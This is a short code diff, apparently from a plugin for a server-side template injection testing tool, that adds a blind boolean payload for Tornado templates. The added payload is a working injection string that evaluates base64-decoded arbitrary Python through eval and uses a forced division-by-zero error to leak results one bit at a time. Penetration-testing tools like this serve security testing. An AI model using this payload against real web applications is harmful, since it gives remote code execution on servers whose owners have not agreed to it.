@@ -43,7 +43,11 @@ class Tornado(python.Python):
             },
             'evaluate_error': {
                 'evaluate': """{code}"""
-            }
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """{{# 1/0 #}}{{% raw str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()))) %}}"""
+            },
         })
 
         self.set_contexts([
